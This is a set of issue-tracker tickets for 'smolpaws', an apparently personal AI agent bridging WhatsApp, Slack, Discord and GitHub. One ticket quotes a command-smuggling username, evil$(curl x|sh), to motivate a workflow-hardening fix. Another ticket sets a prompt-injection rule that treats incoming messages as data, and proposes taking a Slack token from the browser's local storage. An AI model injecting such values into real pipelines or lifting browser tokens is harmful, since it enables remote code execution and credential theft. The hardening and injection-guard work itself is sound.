title: Propagate GitHub token into canonical conversation secrets
description:
Problem
After removing `/run`, the GitHub Worker no longer forwards the resolved GitHub token to the agent-server conversation path. That means tools running inside the canonical conversation path cannot use `GITHUB_TOKEN`, even though the Worker already resolved the correct installation or user token.

Why this matters
- GitHub-aware tools need the token inside the agent runtime, not just in the Worker.
- This was previously available through the bespoke `/run` envelope and got dropped during the refactor.
- Gemini correctly flagged this as a real regression.

Desired outcome
The canonical conversation path should receive the GitHub token as a secret, using the same `GITHUB_TOKEN` name that the agent-server already knows how to register.

title: Lift scheduler + message-debounce into a shared layer; keep poll/store transport-local
description:
WhatsApp (src/, the primary channel) is a root process, while Slack and Discord are thin apps/ bridges on BaseBridgeAdapter + the bridge loader. Two of WhatsApp's responsibilities are arguably generic bridge/runtime concerns that don't belong solely to WhatsApp: (1) task scheduling, and (2) message debounce/collapse. This bead tracks lifting those into a shared layer so every front door benefits, while keeping the genuinely transport-specific pieces (the SQLite store + poll loop) local to poll-based transports like WhatsApp.

Motivation came from comparing against NousResearch's Hermes (~/repos/hermes-agent), which solves the same problems in a single-gateway process.

Findings from Hermes:
- SCHEDULING is fully platform-agnostic. cron/scheduler.py ticks every 60s and delivers to a platform *by name* via the registry (PlatformEntry.cron_deliver_env_var, _KNOWN_DELIVERY_PLATFORMS, per-platform home-channel env vars). Zero WhatsApp knowledge.
- DEBOUNCE/COLLAPSE is generic and lives in BasePlatformAdapter (_text_debounce, _pending_messages, merge_pending_message_event). Every platform gets it.
- POLLING IS NOT GENERIC. Hermes keeps the poll loop + asyncio.Queue inside the WhatsApp and email adapters specifically, because those transports are poll-based (WhatsApp via a Node/Baileys subprocess bridge - same pattern smolpaws uses). Telegram/Slack/Signal push, so they have no poll loop.

smolpaws current state:
- src/task-scheduler.ts already imports runAgentRuntime + findScopeByFolder and takes sendMessage as an INJECTED dependency. Its only WhatsApp coupling is that injected callback - so it is already loosely coupled and close to liftable.
- src/message-loop.ts does 'collapse to latest per chat' - the debounce analogue.
- src/db.ts (SQLite) + the 2s poll loop in src/index.ts are intrinsic to the Baileys poll-based transport.

Key constraint: process topology. Hermes is ONE gateway process, so sharing is trivially in-process. smolpaws is MULTIPLE processes (WhatsApp root + apps/ bridges + agent-server). To share, scheduler + debounce need a home: most likely the agent-server, or the shared bridge layer (src/shared/).
design:
Proposed split (mirrors Hermes):

SHARED (lift out):
- Scheduler: move task-scheduler.ts off the WhatsApp process. Candidate homes: (a) agent-server background loop, or (b) src/shared/ started by the bridge loader. Deliver results via a platform-by-name target abstraction (resolve scope -> bridge/registry -> deliver), not a hard-coded WhatsApp sendMessage. Reuse the existing injected-sendMessage seam but back it with a registry lookup.
- Debounce/collapse: hoist 'collapse to latest per chat' (message-loop.ts) into BaseBridgeAdapter so Slack/Discord get burst-collapsing too. Hermes reference: merge_pending_message_event + TextDebounceState.

TRANSPORT-LOCAL (keep where it is):
- SQLite message store (db.ts) + 2s poll loop: stays in the WhatsApp process. It is a poll-based-transport concern, not a universal bridge concern. Push transports (Slack Socket Mode, Discord gateway) don't need it. Note smolpaws goes one step heavier than Hermes here: Hermes uses an in-memory asyncio.Queue; smolpaws persists to SQLite for crash/restart recovery - a deliberate durability choice worth preserving.
- Scopes/permissions (control-scope.ts): remains WhatsApp-side (Hermes keeps per-platform auth too).

Open design questions:
1. Where does the scheduler live - agent-server vs shared loader-started service? Agent-server is the natural 'single home' since all bridges already terminate there.
2. Delivery target abstraction: introduce something like a deliverToScope(scopeId, text) that resolves the owning front door (WhatsApp JID, Slack channel, Discord channel) via registry, replacing the WhatsApp-only sendMessage callback.
3. Does the scheduler need its own persistence, or reuse agent-server storage? Currently tasks live in src/db.ts (SQLite) alongside messages - decouple them.

Reference reading: docs at enyst.github.io/hermes-plugins.html and hermes-gateway.html; source at ~/repos/hermes-agent (cron/scheduler.py, cron/jobs.py, gateway/platform_registry.py, gateway/platforms/base.py, gateway/platforms/whatsapp.py).
acceptance_criteria:
- Scheduler runs independently of the WhatsApp process and can deliver scheduled-task output to any registered front door (WhatsApp, Slack, Discord) via a platform-by-name/scope abstraction.
- Message debounce/collapse-to-latest is available to all bridges via BaseBridgeAdapter (not just WhatsApp).
- The SQLite store + poll loop remain local to the WhatsApp (poll-based) transport; push bridges are unaffected.
- No regression: existing WhatsApp scheduling + burst-collapse behavior preserved; tests pass.
- A short design note (or update to the enyst.github.io WhatsApp page / AGENTS.md) records the 'generic vs transport-local' split.

title: Support notifications-path mentions outside app-installed repos
description:
Problem
A mention in a repo where the GitHub App is not installed should still be able to trigger SmolPaws through the notifications polling path, but the current implementation has multiple blockers.

Observed case
- `@smolpaws` mention in `enyst/.openhands` issue #4 did not trigger a reply even though the `smolpaws` GitHub account can see the notification.

Current blockers
- `GITHUB_USER_TOKEN` is not configured in the Worker secrets, so scheduled notification polling currently returns early.
- The notifications cron is now hourly, so even with a token the path is delayed by design.
- The current notification handler expects `subject.latest_comment_url` and ignores threads without it, which likely skips issue-body mentions in non-app-installed repos.

Desired outcome
The notifications path should reliably process mentions from allowed authors in allowed repos even when the GitHub App is not installed there, including issue-body mentions where that is a real notification shape.

title: Fix duplicate WhatsApp replies after fresh conversation recovery
description: After clearing a stale WhatsApp conversation/session and restarting SmolPaws, the next inbound message can produce duplicate outbound replies. Investigate whether duplicate delivery comes from repeated outbound claiming, repeated sendMessage calls, or duplicate message-loop processing around backlog recovery / session resets.

title: Summarize task_tracker batches to WhatsApp using Gemini Flash
description: Investigated current wiring. Existing agent-sdk already has a gemini-flash-summarizer profile and tool summarizer infra, but it summarizes individual tool results for the next LLM turn, not for user-facing progress updates. Proposed KISS implementation: in apps/agent-server conversationRuntime, hook conversation.on('event') and buffer events per conversation; when an ObservationEvent for tool_name=task_tracker with observation.command=plan lands, take the buffered slice since the previous task_tracker plan/view boundary, build a compact prompt, call Gemini Flash outside the main conversation (plain LLMFactory/SecretRegistry client using profile gemini-flash-summarizer), save prompt+summary to a clearly named file in the conversation folder (e.g. tracker-summaries.jsonl or tracker-summary-<ts>.json), and append the summary to outbox.jsonl so WhatsApp delivers it. Avoid duplicating normal tool chatter; only emit at tracker milestones, especially when statuses advance to done.
design: Current implementation direction: use a single persisted cursor in conversation state (`tracker_summary_cursor`), not a second event buffer. Detect task_tracker `plan` milestones via the existing AgentHook/ConversationState/EventLog surface, slice the existing restored event list, summarize with the gemini-flash-summarizer profile, save to `tracker-summaries.jsonl`, and let the runner only adapt completed summaries to outbox/current-thread delivery.
notes: KISS update after discussion with Engel: informative operator summaries, no duplicate buffering, seed cursor at current event count for restored conversations so old history is not backfilled by surprise.

title: Try Parakeet/Nemotron STT to replace Whisper in transcribe.py
description:
Our voice-note transcriber (~/.smolpaws/tools/transcribe.py) uses openai-whisper 'base' — oldest/slowest engine and weakest on Engel's non-native accent.

FluidVoice (github.com/altic-dev/FluidVoice, GPLv3 Swift macOS app, 3k+ stars) ships Parakeet TDT v3/v2 and Nemotron Speech 3.5, which are faster and generally more accurate on Apple Silicon. It treats Whisper as the fallback/compat engine.

Plan:
- For the file-based pipeline (transcribing Engel's WhatsApp voice notes), we don't want the GUI app — get the same models via CLI/lib, e.g. parakeet-mlx (pip), or nemotron via MLX.
- Swap load_model/transcribe in transcribe.py to a Parakeet backend; keep Whisper as fallback.
- A/B Parakeet vs Whisper-base on a real Engel voice note; compare accuracy on accented English + latency.
- Separately: Engel may just 'brew install --cask fluidvoice' for personal dictation and try Parakeet TDT v3.

Context: scaffolded a TODO comment at top of transcribe.py pointing here.

title: Fix Chrome Apple Events permission failure handling for X-link inspection
description: SmolPaws saw an X link and tried to inspect it by opening Chrome via AppleScript. The action was logged in events.jsonl and failed with: Not authorized to send Apple events to Google Chrome (-1743). The failed attempt then entered a 5-minute wait/timeout, which was annoying, and the expected macOS permission prompt was not seen by Engel, likely because access had been denied earlier without it being obvious which app was requesting it. Follow-up: determine how to unblock Apple Events access for the relevant requester, avoid long waits after a known authorization failure, and make the failure mode clearer in logs/UI.

title: Integrate ToM-SWE (tom-swe) into TypeScript agent-sdk (tom_consult parity)
description:
Background
- “Tom agent” is ToM-SWE: https://github.com/OpenHands/ToM-SWE (PyPI: tom-swe).
- Python OpenHands Software Agent SDK uses it via openhands-tools:
  - openhands/tools/tom_consult/definition.py + executor.py
  - dependency: tom-swe>=1.0.3 (openhands-tools/pyproject.toml)
  - example: agent-sdk/examples/01_standalone_sdk/30_tom_agent.py

What the Python SDK does today
- Adds TomConsultTool + SleeptimeComputeTool to the agent tool list.
- Passes config params (enable_rag, llm_model, api_key, api_base).
- TomConsultExecutor formats conversation history into LLM-provider message dicts (role + content blocks) and calls:
  - tom_swe.tom_agent.create_tom_agent(...)
  - agent.give_suggestions(user_id, query, formatted_messages)
  - agent.sleeptime_compute(sessions_data, user_id)
- Persistence surface for both OpenHands + Tom is under ~/.openhands (conversations + user modeling files).

Goal
- Bring equivalent Tom integration to the TypeScript SDK SmolPaws is based on: ~/repos/oh-tab/packages/agent-sdk.

Proposed TS implementation
1) Add new tools to TS agent-sdk:
   - tom_consult: consult ToM-SWE for guidance
   - sleeptime_compute: index conversation history for user modeling
2) Implementation approach: spawn a Python helper (python3) from the TS tool that imports tom_swe and runs create_tom_agent + give_suggestions/sleeptime_compute.
   - Inputs passed as JSON (stdin) to avoid shell quoting issues.
   - Outputs returned as JSON and mapped to a TS observation shape { suggestions, confidence?, reasoning? }.
3) Conversation history formatting:
   - Build formatted_messages from ToolContext.events.list() by extracting MessageEvents (skip system).
   - Preserve the OpenHands message shape: { role, content: [{ type: "text", text: "..." }] }.
4) Configuration:
   - Expose enable_rag, llm_model, api_key, api_base (and optionally user_id) as tool params/constructor options.
   - If python3 or tom-swe is missing, return an agent-visible error explaining how to install: pip install tom-swe.
5) Docs / parity:
   - Update oh-tab/packages/agent-sdk/docs/python-parity.md (it currently lists Tom Consult Tools as Python-only).
6) SmolPaws wiring:
   - Bump @smolpaws/agent-sdk once published.
   - Decide whether to include Tom tools by default or behind a feature flag.

Acceptance criteria
- TS agent-sdk can execute a tom_consult tool call end-to-end when python3 + tom-swe are installed.
- Missing dependency errors are actionable and do not crash the runtime.
- No hard dependency on tom-swe for installs/tests unless explicitly enabled.

title: Adapt /setup to run WhatsApp onboarding end-to-end
description:
Problem
Current setup guidance and/or automation does not reliably take a fresh machine from zero to a working WhatsApp connection for SmolPaws. We need a single path that adapts setup to the WhatsApp host in this repo and actually runs the necessary steps.

Goal
Make the setup flow (skill + any supporting code/scripts) walk through and execute WhatsApp onboarding end-to-end for this repo’s architecture.

Scope (proposed)
- Verify prerequisites (Node version, deps installed).
- Ensure required config/secrets exist (WhatsApp auth/session storage paths, any keys).
- Start the WhatsApp host in a way that can display/emit the QR code and confirm successful pairing.
- Persist the session so subsequent runs reconnect without re-auth.
- Validate by sending/receiving a test message and confirming routing into the agent runtime.
- Provide clear failure modes and log pointers (where to look, what to retry).

Acceptance criteria
- Running the setup flow in a clean checkout can complete WhatsApp pairing and persist credentials.
- After setup, the recommended dev command connects without re-pairing.
- A test inbound WhatsApp message triggers the agent and produces a reply.
- Skill text matches actual behavior (no stale vendor-specific wording).

title: Keep WhatsApp host alive via LaunchAgent and bootstrap local agent-server when needed
description:
Problem
The WhatsApp host only runs when started manually, even though it now depends on the same local agent-server path as GitHub.

Desired outcome
Run the WhatsApp host continuously as a LaunchAgent and ensure local message handling can start the local agent-server automatically if it is down.

Key notes
- Use launchd RunAtLoad + KeepAlive semantics, not StartInterval.
- Reuse the same ~/.smolpaws/.env loader as the existing local scripts.
- Bootstrap the local agent-server only for local runner URLs; do not try to spawn arbitrary remote URLs.
- End state is a Mac-local always-on WhatsApp host that still routes through the canonical local agent-server.

title: Investigate a model/agent-selection policy for smolpaws delegation (inspired by 'picking the right models for workflows/subagents')
description:
Idea (from Engel): adapt a prompt like this — a "picking the right model for workflows and subagents" policy — for smolpaws to delegate to OTHER agents/models, though smolpaws' setup is not quite the same (we're OpenHands, we already talk to a sibling agent-canvas conversation, we have LLM profiles, etc.). Look into whether a similar model-selection policy would help smolpaws choose which model/agent to hand a subtask to.

Source text (transcribed from an image Engel sent):

## Picking the right models for workflows and subagents

Rankings, higher = better. Cost reflects what I actually pay (OpenAI has really generous limits), not list price. Intelligence is how hard a problem you can hand the model unsupervised. Taste covers UI/UX, code quality, API design, and copy.

| model    | cost | intelligence | taste |
|----------|------|--------------|-------|
| gpt-5.5  | 9    | 8            | 5     |
| sonnet-5 | 5    | 5            | 7     |
| opus-4.8 | 4    | 7            | 8     |
| fable-5  | 2    | 9            | 9     |

How to apply:
- These are defaults, not limits. You have standing permission to override them: if a cheaper model's output doesn't meet the bar, rerun or redo the work with a smarter model without asking. Judge the output, not the price tag. Escalating costs less than shipping mediocre work.
- Cost is a tie-breaker only; when axes conflict for anything that ships, intelligence > taste > cost.
- Bulk/mechanical work (clear-spec implementation, data analysis, migrations): gpt-5.5 — it's effectively free.
- Anything user-facing (UI, copy, API design) needs taste >= 7.
- Reviews of plans/implementations: fable-5 or opus-4.8, optionally gpt-5.5 as an extra independent perspective.
- Never use Haiku.
- Mechanics: gpt-5.5 is only reachable through the Codex CLI — `codex exec` / `codex review` (my ~/.codex/config.toml defaults to gpt-5.5). Use the codex-implementation, codex-review, and codex-computer-use skills; for work they don't cover (investigation, data analysis), run `codex exec -s read-only` directly with a self-contained prompt.
- Claude models (sonnet-5, opus-4.8, fable-5) run via the Agent/Workflow model parameter.

Using gpt-5.5 inside workflows and subagents (the model parameter only takes Claude models, so use a wrapper):
- Spawn a thin Claude wrapper agent with `model: 'sonnet', effort: 'low'` whose prompt instructs it to write a self-contained codex prompt, run `codex exec` via Bash, and return [truncated in image]

Notes for smolpaws adaptation:
- Our "subagents" today = the agent-canvas sibling conversation + potential future delegations. The model params/CLIs above are that author's setup, not ours — treat as inspiration.
- The transferable core: a small, explicit model/agent-selection policy (axes: cost / intelligence / taste; standing permission to escalate; output over price), and a wrapper pattern to reach a model that isn't natively available.

title: WhatsApp document/PDF attachment captions are not stored as message text
description:
## Summary

When a WhatsApp message in a registered group includes a document/PDF attachment with accompanying text/caption, SmolPaws appears to save the attachment but stores an empty `content` field. This means the message can be observed as media, but any text attached to the document is unavailable for trigger matching and agent context.

## Evidence from smolpaws chat

Chat JID: `120363427179107779@g.us` (`smolpaws chat`).

Recent attachment rows in `~/.smolpaws/whatsapp/messages.db` all have `length(content)=0`:

- `2026-04-28T10:54:12.000Z`, sender `Ami`, `media_type=application/pdf`, stored file `/Users/enyst/.smolpaws/whatsapp/media/5776088c-786a-493c-9bef-35897e8e8e6c.pdf`, `content=`
- `2026-04-28T10:41:21.000Z`, sender `Ami`, `media_type=application/pdf`, stored file `/Users/enyst/.smolpaws/whatsapp/media/6899fad8-b6ac-43b3-90c9-ecfebcc2f5d0.pdf`, `content=`
- `2026-04-28T10:26:08.000Z`, sender `Ami`, DOCX media, `content=`
- `2026-04-28T10:24:07.000Z`, sender `Ami`, DOCX media, `content=`

Operational symptom observed on 2026-04-28: a PDF attachment message arrived and was logged as `New messages`, but did not trigger processing because no `@smolpaws` text was present in the stored `content`. A later separate text message with `@smolpaws` did trigger processing.

## Suspected root cause

`src/db.ts` `storeMessage()` extracts text from:

- `msg.message?.conversation`
- `msg.message?.extendedTextMessage?.text`
- `msg.message?.imageMessage?.caption`
- `msg.message?.videoMessage?.caption`

It does not currently check `msg.message?.documentMessage?.caption` (or other document-like caption fields). `src/index.ts` already recognizes and downloads `documentMessage` media, so the attachment file is saved, but the caption/text portion is likely dropped before insertion into SQLite.

## Investigation notes

No fix was applied as part of filing this bead. The likely follow-up is to confirm the exact Baileys shape for document/PDF captions and update the text extraction path plus tests so document captions are preserved for trigger matching and context.

## Acceptance criteria

- A WhatsApp document/PDF message with caption text stores that caption in `messages.content`.
- `@smolpaws` inside a document/PDF caption triggers the agent in registered non-main groups.
- Agent context includes the caption text alongside the saved attachment metadata.
- Regression tests cover document captions without changing image/video/plain-text behavior.

title: Cross-group conversation context mixup after WhatsApp restart
description:
Symptom: after a WhatsApp restart (smolpaws prints "I'm up." in the main conversation on restart), conversation context from different WhatsApp groups gets mixed up — the agent answers in one group using context/history that belongs to another group.

Concrete instance (2026-07-06): Engel was messaging in the OpenHands group (chat_jid 120363426327189600@g.us). smolpaws answered there but pulled and acted on context from the Hunting group (chat_jid 120363425888191045@g.us) — specifically a "yes, handle it… new bridge?" instruction that was actually sent in Hunting (re: the Resend Agent Email Inbox bridge), treating the two groups' threads as one. Engel confirmed: "we are in openhands group, here, not Hunting group" and noted smolpaws had just restarted.

Hypothesis (unconfirmed — DO NOT investigate yet, just filed): after a restart, per-scope/per-group conversation isolation or the scope→conversation mapping (data/sessions.json, scope resolution in the message loop, or backlog/"messages since last agent interaction" recovery) may bleed across group scopes, so one group's session or backlog is attributed to another.

Where to look later (notes only): src/index.ts processMessage / runAgent scope resolution (scopeFromRegisteredGroup, lastAgentTimestamp keyed by chat_jid), data/sessions.json (scopeId→conversationId), getMessagesSince backlog per chat_jid, and any restart/recovery path that reloads state. Check whether a scope's conversationId or backlog can be keyed/reused wrongly after restart.

Impact: potentially serious — cross-group context bleed can leak information between groups and cause the agent to act on the wrong group's instructions. Prompt-injection / privacy adjacent.

Repro idea (later): have active conversations in two groups, restart the WhatsApp host, then message one group and check whether it uses the other group's context.

title: WhatsApp router serial processing lets one channel block all channels
description:
Architectural issue discovered 2026-07-07: the WhatsApp bridge has per-scope conversations, but src/index.ts processes all registered WhatsApp chats through one global sequential startMessageLoop. It awaits processMessage(msg) for each pending message before advancing lastTimestamp or polling the next batch.

Observed symptom: Main, OpenHands, and Hunting all appeared stopped while the host process was still alive. Logs stopped after "Processing message" for Hunting; runner API showed hunting-mr2qmzbi / turn-25-28vxfa still running; SQLite had newer stored messages for Main/OpenHands/Hunting behind router_state.last_timestamp.

Impact: a long-running or stuck agent turn in one group can starve every other WhatsApp channel. This is privacy/availability-adjacent because unrelated scopes share one router progress cursor and delivery loop.

Likely direction later: make inbound delivery per-chat/per-scope concurrent or queued independently, with per-chat cursors/backpressure and clear handling for stuck/long-running turns. Do not fix now; track for the ongoing rewrite.

title: Deduplicate GitHub webhook triggers that spawn multiple agent conversations
description:
When Engel posts a comment on a thread smolpaws is subscribed to, the ingress can fire multiple times (webhook + notification poll, or repeated webhook deliveries). This results in duplicate agent conversations responding to the same comment.

Observed on issue #76: the same message triggered two separate agent runs that both tried to do the same work.

Possible approaches:
- Dedupe at the Worker queue level (already partially done for mention identity)
- Dedupe at the agent-server level (conversation-scoped idempotency)
- Dedupe at the ingress routing level (skip if a conversation for this thread is already in-flight)

Related: smolpaws-z3l (will make this worse once we listen on all whitelisted-user threads)

title: Apply env-var shell injection guards across our GitHub workflows
description: From microsoft/agent-governance-toolkit: attacker-influenced values (usernames, PR titles, branch names) flowing into shell steps via ${{ }} expression interpolation can be exploited (e.g., username like evil$(curl x|sh)). The fix: always pass GitHub context values through env: blocks instead of inline ${{ }} in shell scripts. Audit all .github/workflows/*.yml in smolpaws and oh-tab repos for this pattern.

title: Add transcript-backed turn metadata and active-turn message acceptance to agent-server
description: Teach apps/agent-server to treat turns as execution spans over the persisted conversation transcript. An accepted user message on an idle conversation starts a new turn; additional accepted user messages during an active turn bind to that same turn; the next accepted user message after a terminal turn starts the next turn. Keep transcript/event log as the source of truth, and preserve safe-boundary insertion: never splice a new user MessageEvent between an ActionEvent and its matching ObservationEvent.

title: Finish neutral scope naming and remove remaining group/main aliases
description:
Problem
The runtime model has been moved to neutral execution scopes, but the WhatsApp host/runtime seam still carries legacy aliases like `groupFolder` and `isMain` in `src/agent-runtime/types.ts`, `src/index.ts`, and `src/task-scheduler.ts`. The mount-security path also still uses `isMain` terminology.

Why this matters
- The codebase conceptually moved from tenancy-by-group toward trusted scopes, but the runtime payloads still tell two stories.
- This makes the remaining security and task code harder to reason about than it needs to be.

Desired outcome

title: Refresh incoming secrets when reusing a live conversation
description:
Problem
`createConversationRecord(...)` returns early for an existing live conversation and only refreshes the SmolPaws config. New incoming secrets on `POST /api/conversations` are ignored in that path.

Why this matters
- GitHub installation tokens are short-lived and must be refreshed across comments.
- Even if the Worker starts sending `GITHUB_TOKEN`, reused conversations would still keep the stale or missing secret.
- This is a general canonical conversation bug, not just a GitHub-only detail.

Desired outcome
When `POST /api/conversations` reuses a live conversation, the server should also apply the incoming secrets to that conversation before the next user message runs.

title: Support LLM profiles and per-profile API keys in the standalone agent-server
description:
Problem
The standalone smolpaws agent-server currently reads direct env LLM settings only. It does not accept or resolve profile IDs against ~/.openhands/llm-profiles, and it does not know how to load per-profile API keys outside the VS Code extension host.

Why this matters
- Local single-model startup is fine for now, but multi-model use still works only in the extension path.
- We want the standalone runtime to stay simple while still supporting the same profile selection model when needed.
- A later VS Code secret bridge may help, but the runtime should first know how to resolve profile config at all.

Desired outcome
The standalone agent-server should be able to accept a profile id, load profile config from ~/.openhands/llm-profiles, and use a matching local secret source for the provider key, without depending on the VS Code extension process.

Desired outcome
Add a short, always-on note in agent context describing where canonical conversation logs live and the naming pattern for common ingresses, including GitHub thread-scoped conversations and local/WhatsApp conversations.

Scope
- Mention the canonical conversation root under ~/.openhands/conversations
- Mention that GitHub conversations are thread-scoped (for example github-owner-repo-number)
- Mention that local/WhatsApp conversations use local-* ids
- Keep it brief and operational, not a long doc dump

title: Trigger smolpaws on Slack unread replies/mentions (not all activity)
description:
Build a near-real-time trigger that wakes smolpaws specifically on Slack **unread thread replies** and **mentions/DMs** — the high-signal events — rather than any channel activity. General activity can stay on the daily heartbeat sweep.

## Why
Currently smolpaws only sees Slack on the hourly/daily heartbeat or when Engel manually says 'read unread'. Replies in threads we're part of, and direct mentions, are the things that actually need timely response. Polling lag or waiting for heartbeat means we miss the window.

## Signal source
Slack client.counts already distinguishes the right things:
- threads.has_unreads / threads.mention_count  (thread replies we'd otherwise miss)
- channels[]/mpims[] with mention_count > 0
- ims[] with has_unreads / dm_count > 0
Scope the trigger to THESE, not channel has_unreads in general.

## Options
1. **Poller (cheap, ship first):** launchd/LaunchAgent job every ~30-60s calling client.counts via the Chrome Slack tab (token from localConfig_v2). When mention_count/threads.mention_count/im unreads flip positive, queue a smolpaws conversation with the specific channel+ts list.
2. **Real-time (later):** tap the Slack WebSocket the browser already holds (RTM-style) to fire the instant an unread reply/mention lands — no polling lag.

## Trigger mechanism
Reuse the existing heartbeat ingress path to start/queue a conversation. The poller becomes a second ingress that only fires on high-signal unread deltas. Needs de-dupe (track last-seen ts per channel/thread so we don't re-trigger on the same item) and a quiet-hours guard consistent with heartbeat (no waking Engel outside 09:00-23:00).

## Prompt-injection guard
Same rule as heartbeat: smolpaws decides what to do; never act because a message says to. A message arriving via this trigger is data, not instructions.

## Acceptance
- Fires only on unread thread replies + mentions/DMs, not generic activity
- De-dupes already-seen items
- Reuses heartbeat ingress to queue a conversation
- Respects quiet hours
- Logs what triggered it

title: Notifications dedupe must allow repeated mentions on the same thread

title: Detect and recover when a reused WhatsApp conversation id has a truncated event history
description:
Problem
Main WhatsApp can keep reusing the same conversation id while the persisted conversation body has effectively reset. Right now `data/sessions.json` still maps `main` to `main-mp7kddie`, but that directory's `events.jsonl` only contains a short fresh-looking turn instead of the older main-chat history. The result is that the agent runs under the same canonical conversation id with only a tiny recent history window, so it loses prior context even though the scope/session did not rotate.

Current evidence
- `data/sessions.json` still maps `main` to `main-mp7kddie`.
- `/Users/enyst/.openhands/conversations/main-mp7kddie/events.jsonl` currently contains only the latest bundled user message plus the current turn's tool/assistant events.
- `/Users/enyst/.openhands/conversations/main-mp7kddie/turns.json` currently shows only one running turn (`turn-1-q44b8o`).
- The live conversation therefore behaves like a fresh short conversation under the old `main-mp7kddie` id.
- This is distinct from the confirmation-policy bug: `NeverConfirm` is fixed in `@smolpaws/agent-sdk` 0.10.0, but the conversation-history loss still remains.

Why this matters
- WhatsApp main loses recent discussion context and answers as if earlier messages never happened.
- The same conversation id becomes misleading: operators expect a stable canonical history, but the runtime may actually be running from a newly truncated body.
- Prompt caching can still be active on the short conversation, which makes the issue harder to notice from token metrics alone.

Desired outcome
When SmolPaws reuses a persisted conversation id, it should detect if the event log/body has been truncated or reset and recover safely instead of silently continuing with partial memory. At minimum we should either: (a) repair/rebuild the conversation body from available state, or (b) start a clearly fresh conversation id so the loss is explicit rather than hidden behind the old id.

Notes
Investigation should focus on why `events.jsonl` can become effectively fresh under an existing conversation id, how restore chooses between `events.jsonl` and `turns.json`, and whether the agent-server should detect and quarantine this drift automatically.
acceptance_criteria:
- Reusing a WhatsApp conversation id cannot silently run with a truncated `events.jsonl` body under the old id.
- The runtime detects event-log vs persisted-turn drift (or equivalent reset symptoms) before executing the next user turn.
- Recovery behavior is explicit and safe: either rebuild enough history to preserve context, or mint a fresh conversation id/session mapping instead of pretending the old history still exists.
- Add regression coverage for the detected drift/reset path.

title: WhatsApp ingress delivers duplicate messages to agent
description:

Symptoms:

Likely areas to investigate:

- Message deduplication by message ID vs timestamp
- Race condition between message processing and timestamp advancement
- Possible re-delivery from the WhatsApp connection (Baileys reconnection / message upsert)

title: Add heartbeat ingress so HEARTBEAT.md can wake smolpaws proactively

title: Design agent UX for non-developers — the real-world user problem

Regular people only see chatbots and don't know what agents can actually do for them. Liberty Labs bet: make SmolPaws something non-developers can use. Key questions: (1) What do people need done that they don't know an agent can do? (filing taxes, managing appointments, tracking expenses, family logistics, writing applications) (2) What UX makes someone 'get it' in 30 seconds? (3) The moat is memory — a chatbot forgets you, SmolPaws knows you. (4) liberty-chat is proof of concept #1 . Think about: onboarding flow, first-run experience, what the 'aha moment' looks like.

title: Add chat ingress paths for Slack and Discord

Problem

Desired outcome

title: Orphaned outbound replies are never re-delivered (no TTL on delivery-owner claim)
description:
WhatsApp group replies can be generated by the agent but never delivered, with no auto-recovery.

## Symptom
After a router restart (2026-06-23 ~11:19), untagged messages in the OpenHands group (triggerFree=true) were received and answered by the agent (turn-124 completed, conversation IDLE), but the replies were never sent to the group. They sat stranded in the conversation outbox:
  ~/.openhands/conversations/openhands-mq0xmn6g/outbox.jsonl

Notably, two of the stranded entries were from turns 62-63 (days old) — so this is a pre-existing leak, not restart-specific. The restart just made it visible.

## Root cause
Outbound delivery is tied to a per-turn 'delivery owner' claim with NO TTL/expiry:
- src/agent-runtime/local-agent-server.ts::monitorConversationTurn polls and claims turn outbound messages only while it actively monitors that turn (deadline TURN_TIMEOUT_MS = 30min).
- apps/agent-server/src/runner/turnState.ts::assignDeliveryOwner sets turn.delivery_owner_id permanently; once set to a given owner id, only that exact id can claim. There is no expiry or reassignment path.
- Outbox entries (apps/agent-server/src/runner/outbox.ts) are claimed by turn_id; if the monitoring process dies / loses the window (restart, WhatsApp AwaitingInitialSync gap, crash) before claiming+sending, the entries are orphaned forever. A new process generates a fresh deliveryOwnerId and cannot claim the old turn's outbounds.

## Impact
Any reply that misses its monitor window (restart, reconnect/sync gap, crash) is silently lost. No redelivery, no error surfaced to the user — looks like the bot 'went silent'.

## Suggested fix
- Add a TTL / staleness to the delivery-owner claim so a new monitor can re-claim a turn whose owner has gone away (e.g. delivery_owner_claimed_at older than N seconds => reassignable).
- On router startup, sweep existing conversation outboxes for undelivered entries and re-deliver (or expose a claim-all path keyed by conversation rather than live turn).
- Surface undelivered-outbox count as a health signal.

## Workaround applied
Manually cleared the 4 stranded entries for openhands-mq0xmn6g (backup at outbox.jsonl.bak.1782207860). Group works again.

title: Recover stale smolpaws conversations generically across ingresses
description:
Problem
Only WhatsApp currently resets reused conversations that are already stuck in waiting_for_confirmation or max_iterations_exceeded. GitHub and any future ingress still reuse stale conversations blindly because the canonical agent-server create/reuse seam does not recover them.

Desired outcome
When SmolPaws reuses a conversation for a new incoming message, the canonical agent-server path should detect stale waiting_for_confirmation and exhausted conversations and reset them generically, so all ingresses get the same recovery behavior.

Scope
- Implement at the shared agent-server conversation reuse boundary, not only in a specific ingress client.
- Cover both waiting_for_confirmation and max_iterations_exceeded recovery.
- Preserve normal conversation reuse for healthy idle/running flows.

title: Turn Daytona into a workspace backend instead of a special /run path
description:
Problem
Daytona still lives as a special case inside `apps/agent-server/src/agent-server/conversationRouter.ts` via `maybeRunInDaytona(...)`, instead of being modeled as a workspace backend parallel to local Apple-container execution.

Why this matters
- It keeps host lifecycle logic inside the request route instead of the workspace layer.
- It diverges from the Python reference model, where workspaces own runtime lifecycle and the agent-server stays generic.
- It makes the `/run` path carry deployment concerns that should be below the conversation boundary.

Desired outcome
Introduce a Daytona-backed workspace path so both local and Daytona execution target the same agent-server surface, with workspace selection contained in one place and `/run` no longer owning Daytona-specific branching.
notes: Intentionally deferred while we stabilize and test the local plain-runner path. Keep the target architecture aligned with the Python workspace model: workspace owns lifecycle, agent-server stays generic, Daytona becomes a sibling backend to AppleWorkspace rather than a special /run branch.

title: Investigate realtime voice for SmolPaws (smolagents HF Realtime Voice Space)
description:
Look into the smolagents "HF Realtime Voice" Space as a reference/prototype for giving SmolPaws real-time spoken conversation (not just the current one-shot voice notes + Whisper transcription).

## Link
https://huggingface.co/spaces/smolagents/hf-realtime-voice

## What it is
A realtime voice loop from the smolagents team: speak into the mic → app transcribes (STT) → an AI generates a reply → it speaks the response back (TTS), "instantly." You only provide audio; you hear audio back. It's the full duplex STT→LLM→TTS pipeline as a working demo (HF Space, likely Gradio + a WebRTC/streaming layer like FastRTC under the hood — confirm when investigating).

## Why it matters for SmolPaws
Today SmolPaws' voice is asynchronous and one-shot: Whisper transcribes incoming WhatsApp voice notes, and `say -v "Evan (Enhanced)"` / TTS-to-ogg sends voice notes back. There's no live back-and-forth. A realtime loop would let Engel actually *talk* to SmolPaws — which also directly serves his English speaking-practice goal (low-pressure spoken conversation), and pairs with the SmolPawsBall physical presence.

## What to investigate
